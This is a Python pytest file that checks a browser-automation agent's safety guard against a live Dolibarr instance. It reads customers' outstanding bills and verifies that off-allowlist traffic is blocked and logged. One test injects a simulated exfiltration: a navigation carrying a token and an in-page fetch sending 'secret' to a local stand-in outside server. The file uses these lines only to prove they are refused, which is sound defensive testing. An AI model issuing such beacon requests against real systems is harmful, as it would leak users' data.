"""M1 acceptance on the real Dolibarr target, through `open_session` (real PolicyGuard, real guarded context).

(a) a scripted, non-model driver opens a seeded customer by refs and reads "Current outstanding bill";
(b) that value equals the REST view of the customer's unpaid invoices;
(c) an off-allowlist navigation is blocked AND logged: a guard-denied `navigate` (PolicyDenied, UI untouched) and an
    in-page request the network layer refuses; both are in the run's `events.jsonl`.

The driver is plain code: it takes a ref from the observation snapshot, resolves it with `element_for_ref` and acts.
"""

from __future__ import annotations

import asyncio
import json
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "target" / "dolibarr"))

from dolirest import Rest, customer_by_code, outstanding_of, parse_amount  # noqa: E402
from livetarget import reset_to_baseline  # noqa: E402

from cua.config import settings  # noqa: E402
from cua.control.runtime import Session, open_session  # noqa: E402
from cua.safety.policy import ActionRequest, PolicyDenied  # noqa: E402
from cua.surface import snapshot as snap  # noqa: E402
from cua.surface.names import same_name  # noqa: E402

pytestmark = pytest.mark.live


@pytest.fixture(scope="module")
def baseline():
    """The seeded post-seed state: the fixture customers carry the outstanding amounts fixtures.json promises."""
    return reset_to_baseline()


def request(session: Session, kind: str, *, target_url: str | None = None) -> ActionRequest:
    return ActionRequest(
        kind=kind,  # type: ignore[arg-type]
        actor="replay",
        page_url=session.surface.page.url,
        target_url=target_url,
        effect="none",
        lease=session.lease(),
    )


async def observe_until(session: Session, ready, *, seconds: float = 15.0):
    """A page change may still be loading right after an action; observe until `ready(obs)` (the classifier's job
    in the real loop, a poll here)."""
    deadline = asyncio.get_running_loop().time() + seconds
    while True:
        obs = await session.surface.observe(screenshot=False)
        if ready(obs) or asyncio.get_running_loop().time() > deadline:
            return obs
        await asyncio.sleep(0.3)


def find_ref(text: str, role: str, name: str) -> str | None:
    for node in snap.parse(text):
        if node.role == role and node.ref and same_name(name, node.name):
            return node.ref
    return None


def ref_of(text: str, role: str, name: str) -> str:
    ref = find_ref(text, role, name)
    if ref is None:
        raise AssertionError(f"no {role} named {name!r} in the observation")
    return ref


async def go(session: Session, url: str) -> None:
    await session.surface.navigate(url, request(session, "navigate", target_url=url))


async def click_ref(session: Session, role: str, name: str, obs) -> None:
    element = await session.surface.element_for_ref(ref_of(obs.snapshot, role, name), obs.epoch)
    await session.surface.click(element, request(session, "click"))


async def read_outstanding_bill(session: Session, customer) -> str:
    """List page -> name link -> the "Customer" tab, where the label lives; returns the text beside the label."""
    list_url = f"{session.base_url}/societe/list.php?type=c&search_customer_code={customer.code}"
    await go(session, list_url)
    obs = await observe_until(session, lambda o: customer.name in o.snapshot)
    await click_ref(session, "link", customer.name, obs)

    obs = await observe_until(session, lambda o: find_ref(o.snapshot, "link", "Customer") is not None)
    await click_ref(session, "link", "Customer", obs)

    label = "Current outstanding bill"
    obs = await observe_until(session, lambda o: find_ref(o.snapshot, "generic", label) is not None)
    box = await session.surface.element_for_ref(ref_of(obs.snapshot, "generic", label), obs.epoch)
    return await session.surface.read_text(box)


def read_events(session: Session) -> list[dict]:
    text = (session.evidence.run_dir / "events.jsonl").read_text(encoding="utf-8")
    return [json.loads(line) for line in text.splitlines() if line.strip()]


async def test_a_and_b_scripted_driver_reads_the_outstanding_bill_that_rest_agrees_with(baseline, tmp_path):
    admin = Rest.admin(settings())
    seen = []
    async with open_session(run_id="m1-read", evidence_root=tmp_path) as session:
        for key in ("alpha", "beta"):
            customer = baseline.customer(key)
            shown = parse_amount(await read_outstanding_bill(session, customer))
            socid = customer_by_code(admin, customer.code)["id"]
            assert shown == outstanding_of(admin, socid) == customer.outstanding
            seen.append(shown)
    assert len(set(seen)) == 2  # two different customers, two different amounts


class Outside:
    """A local origin that is not on the allowlist. Its hit log is the oracle: a request that reached it escaped."""

    def __init__(self) -> None:
        self.hits: list[str] = []
        outer = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):  # noqa: D102
                pass

            def do_GET(self):  # noqa: N802
                outer.hits.append(self.path)
                self.send_response(200)
                self.send_header("Content-Length", "2")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"ok")

        self.httpd = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        self.origin = f"http://127.0.0.1:{self.httpd.server_address[1]}"

    def close(self) -> None:
        self.httpd.shutdown()
        self.httpd.server_close()


async def test_c_off_allowlist_navigation_is_blocked_and_logged(baseline, tmp_path):
    outside = Outside()
    try:
        async with open_session(run_id="m1-blocked", evidence_root=tmp_path) as session:
            page = session.surface.page
            before = page.url

            # 1. the guard refuses a navigation to an origin that is not on the allowlist; the UI is untouched
            target = f"{outside.origin}/landing?token=abc123"
            with pytest.raises(PolicyDenied) as denied:
                await go(session, target)
            assert denied.value.decision.rule == "origin_allowlist"
            assert page.url == before

            # 2. a request the page itself makes (a script, an image, a form) is refused by the network layer
            await page.evaluate(f"fetch({outside.origin + '/beacon?x=secret'!r}).catch(() => null)")
            await page.evaluate("fetch('/admin/index.php').catch(() => null)")  # allowed origin, denied path
            await page.wait_for_timeout(500)
            events = read_events(session)
    finally:
        outside.close()

    assert outside.hits == []  # nothing reached the outside origin, whatever the page tried
    policy = [e for e in events if e["kind"] == "policy"]
    guard_events = [e for e in policy if e["actor"] == "replay"]
    network_events = [e for e in policy if e["actor"] == "system"]
    assert [(e["action"]["kind"], e["policy"]["rule"]) for e in guard_events] == [("navigate", "origin_allowlist")]
    assert {e["detail"]["rule"] for e in network_events} == {"origin_allowlist", "path_rules"}
    assert all(e["policy"]["allowed"] is False for e in policy)
    on_disk = (tmp_path / "m1-blocked" / "events.jsonl").read_text(encoding="utf-8")
    assert "abc123" not in on_disk and "secret" not in on_disk  # query strings are never logged
